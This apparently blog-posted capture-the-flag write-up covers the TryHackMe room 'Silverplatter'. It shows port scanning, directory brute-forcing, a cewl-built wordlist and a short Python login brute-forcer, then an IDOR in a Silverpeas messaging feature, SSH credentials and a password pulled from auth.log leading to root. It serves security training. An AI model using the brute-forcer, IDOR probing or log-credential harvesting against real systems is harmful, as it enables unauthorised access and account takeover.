---
title: "Silverplatter"
date: 2025-01-18T14:09:39+01:00
draft: false
hidden: false
tags:
    - ctf
    - tryhackme
    - writeup
summary: ""
---

|Revised Date | Author | Comment |
| ----------- | ------ | ------- |
| 18.01.2025  | Roger Johnsen | Article added |

## Introduction

> _Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong. Dive into their web server, find the hidden flags, and show the world your elite hacking skills. Good luck, and may the best hacker win!
But beware, this won't be a walk in the digital park. Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that's how 'cool' they are). The hacking gauntlet has been thrown, and it's time to elevate your game. Remember, only the most ingenious will rise to the top._
>
>_May your code be swift, your exploits flawless, and victory yours!_

Availability: https://tryhackme.com/r/room/silverplatter 

--- 

## Portscanning

```bash
nmap -sS -Pn -p- -oN scan.txt 10.10.88.182

# Nmap 7.94SVN scan initiated Sat Jan 18 14:13:08 2025 as: /usr/lib/nmap/nmap --privileged -sS -Pn -p- -oN scan.txt 10.10.88.182
Nmap scan report for 10.10.88.182
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

# Nmap done at Sat Jan 18 14:13:49 2025 -- 1 IP address (1 host up) scanned in 41.41 seconds
```

## Inspection port 80

Inspecting the HTML source there is a mention of username _scr1ptkiddy_ and something called _Silverpeas_. This might be a domain name. 

```html
<article id="contact">
    <h2 class="major">Contact</h2>
    <p>If you'd like to get in touch with us, please reach out to our project manager on Silverpeas. His username is "scr1ptkiddy".</p>
    <ul class="icons">
        <li><a href="#" class="icon brands fa-twitter"><span class="label">Twitter</span></a></li>
        <li><a href="#" class="icon brands fa-facebook-f"><span class="label">Facebook</span></a></li>
        <li><a href="#" class="icon brands fa-instagram"><span class="label">Instagram</span></a></li>
        <li><a href="#" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
    </ul>
</article>
```

Inspecting directory structure using Gobuster: 

```bash
gobuster dir -u http://10.10.88.182 -w /home/kali/Documents/kali-wordlists/dirb/common.txt -e

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.88.182
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/kali-wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.88.182/assets               (Status: 301) [Size: 178] [--> http://10.10.88.182/assets/]
http://10.10.88.182/images               (Status: 301) [Size: 178] [--> http://10.10.88.182/images/]
http://10.10.88.182/index.html           (Status: 200) [Size: 14124]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Concluding my work here.

## Inspection port 8080

Nothing much visual here to look at. Firing up Gobuster:

```bash
gobuster dir -u http://10.10.88.182:8080 -w /home/kali/Documents/kali-wordlists/dirb/common.txt -e

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.88.182:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/kali-wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.10.88.182:8080/console              (Status: 302) [Size: 0] [--> /noredirect.html]
http://10.10.88.182:8080/website              (Status: 302) [Size: 0] [--> http://10.10.88.182:8080/website/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

Console and website path. _/console_ redirects to _/noredirect.html_, and _/website_ states _Forbidden_.


## Silverpeas

Testing out if the reference _Silverpeas_ is indeed a reference to a domain/website. Adding to ```/etc/hosts```:

```bash
10.10.88.182 silverpeas.thm
```

{{% notice style="tip" title="tip" icon="exclamation" %}}
Whenever working with fuzzers, keep a shadow copy of the built in Kali wordlists in a separate directory. Then add any references you find to the shadow copy. This way you avoid polluting the stock wordslists in, say, Kali. In my case, I added "silverpeas" to the _common.txt_ dictionary I have in a separate folder.

```bash
echo "silverpeas" >> /home/kali/Documents/kali-wordlists/dirb/common.txt
```
{{% /notice %}}

Letting Gobuster loose again, first on port 80 which it found nothing new on, then on port 8080:

```bash
gobuster dir -u http://silverpeas.thm:8080 -w /home/kali/Documents/kali-wordlists/dirb/common.txt -e

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://silverpeas.thm:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/kali-wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://silverpeas.thm:8080/console              (Status: 302) [Size: 0] [--> /noredirect.html]
http://silverpeas.thm:8080/website              (Status: 302) [Size: 0] [--> http://silverpeas.thm:8080/website/]
Progress: 4615 / 4616 (99.98%)
http://silverpeas.thm:8080/silverpeas           (Status: 302) [Size: 0] [--> http://silverpeas.thm:8080/silverpeas/]
===============================================================
Finished
===============================================================
```

This reveals an interesting redirect!

* From: _hxxp[://]silverpeas[.]thm:8080/silverpeas_
* To: _hxxp[://]silverpeas[.]thm:8080/silverpeas/_ 

Upon visiting we are greeted with a login form: 

![Login form](/images/ctf/tryhackme/silverplatter/silveplatter-1.png)

Alread in the rooms description there are some important hints: 

> Hack Smarter Security has fortified the server against common attacks and their password policy requires passwords that have not been breached (they check it against the rockyou.txt wordlist - that’s how ‘cool’ they are)

It cleary hints that we, somewhere, are in need of a dictionary other than _rockyou.txt_. And _cool_ probablye hints at _cewl_. Creating a custom dictionary, right? The only thing with text that could be relevant is the website running on port 80. Creating a new dictionary based on this: 

```bash
cewl http://10.10.88.182:80 > customlist.txt
```

I made a quick and dirty login bruteforcer based on what I saw in Chrome browser network inspect upon manual logon: 

```python
import requests

with open("customlist.txt", "r") as dic:
    for line in dic.readlines():
        password = line.strip("\n")
    
        res = requests.post(
            "http://silverpeas.thm:8080/silverpeas/AuthenticationServlet",
            data={
                "Login": "scr1ptkiddy",
                "Password": password,
                "DomainId": 0
            }    
        )
        if "Login or password incorrect" not in res.text:
            print(password)
            break
```

Found this password: 

```
adipiscing
```

When logging in I was greeted by this landingpage:

![Landing page](/images/ctf/tryhackme/silverplatter/silveplatter-2.png)

Looking around I found a messaging utility:

![Messaging utility](/images/ctf/tryhackme/silverplatter/silveplatter-3.png)

Toying with the GET arguments, there seems to be an IDOR in the message ID argument, meaning I can access other peoples messages: 

![Messaging IDOR](/images/ctf/tryhackme/silverplatter/silveplatter-4.png)

The message contained this credential, which works for SSH:

```
tim:cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

User flag can easily be obtained by logging in as Tim as reading the flag file in his home folder. Further inspection reveals that Tim is a part of an admin (adm) group: 

```bash
tim@silver-platter:~$ id
uid=1001(tim) gid=1001(tim) groups=1001(tim),4(adm)
```

So Tim might have some elavated rights. Are there any other users on this system?

```bash
tim@silver-platter:~$ ls /home
tim  tyler
```

Trying to figure out who this Tyler could be: 

```bash
tim@silver-platter:/$ lslogins -u tyler
KZAK>>> alloc '0x561348364540' for tyler
Username:                           tyler
UID:                                1000
Gecos field:                        root
Home directory:                     /home/tyler
Shell:                              /bin/bash
No login:                           no
Primary group:                      tyler
GID:                                1000
Supplementary groups:               lxd,adm,cdrom,sudo,dip,plugdev
Supplementary group IDs:            110,4,24,27,30,46
Last login:                         2024-May08
Last terminal:                      pts/0
Last hostname:                      192.168.1.20
Running processes:                  0

Last logs:
2024-May08 systemd[1949]: Startup finished in 68ms.
2024-May08 sudo[2072]:    tyler : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/su
2024-May08 sudo[2072]: pam_unix(sudo:session): session opened for user root(uid=0) by tyler(uid=1000)

tim@silver-platter:/$
```

From the looks of it, Tyler can su to ROOT. Lets take a closer look at the logs:

```bash
tim@silver-platter:/var/log$ grep -Rni tyler * | grep -i sudo | grep -i password
grep: amazon: Permission denied
grep: btmp: Permission denied
grep: btmp.1: Permission denied
auth.log.2:54:Dec 12 19:39:15 silver-platter sudo:    tyler : 3 incorrect password attempts ; TTY=tty1 ; PWD=/home/tyler ; USER=root ; COMMAND=/usr/bin/apt install nginx
auth.log.2:106:Dec 13 15:40:33 silver-platter sudo:    tyler : TTY=tty1 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/docker run --name postgresql -d -e POSTGRES_PASSWORD=_Zd_zx7N823/ -v postgresql-data:/var/lib/postgresql/data postgres:12.3
```

In relation to Tyler I could see a Postgres password being used. Trying that password (```_Zd_zx7N823/```) to become Tyler:

```
tim@silver-platter:/var/log$ su tyler
Password:
tyler@silver-platter:/var/log$ sudo -l
Matching Defaults entries for tyler on silver-platter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User tyler may run the following commands on silver-platter:
    (ALL : ALL) ALL
tyler@silver-platter:/var/log$ sudo su
root@silver-platter:/var/log# cd /root
root@silver-platter:~# ls
root.txt  snap  start_docker_containers.sh
root@silver-platter:~# cat root.txt
```

Just following the trail I did:

* su to tyler
* list tylers sudo rights. He can use sudo without password
* sudo to root (sudo su)
* then change to /root and cat the flag.

Done.